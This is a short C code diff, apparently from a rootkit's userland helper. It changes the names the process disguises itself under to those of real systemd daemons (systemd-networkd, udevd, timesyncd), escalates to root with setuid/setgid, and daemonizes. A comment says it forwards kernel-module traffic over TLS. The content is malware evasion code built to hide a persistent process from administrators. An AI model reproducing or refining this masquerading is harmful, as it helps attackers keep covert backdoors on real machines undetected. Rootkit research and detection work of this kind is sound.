@@ -133,11 +133,17 @@ void mask_process(char** argv, const char *process_mask) {
  * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
  */
 int main(int argc, char** argv) {
-    const char* mask_1 = "/usr/lib/systemd/systemd-journald2";
-    const char* mask_2 = "/usr/lib/systemd/systemd-journald3";
-    const char* mask_3 = "/usr/lib/systemd/systemd-journald4";
-    setuid(0);
-    setgid(0);
+    const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
+    const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
+    const char* mask_3 = "/usr/lib/systemd/systemd-timesyncd";
+    if (setuid(0)) {
+        perror("setuid");
+        exit(EXIT_FAILURE);
+    }
+    if (setgid(0)) {
+        perror("setgid");
+        exit(EXIT_FAILURE);
+    }
 
     //Daemonize
     if (wrapped_fork()) {
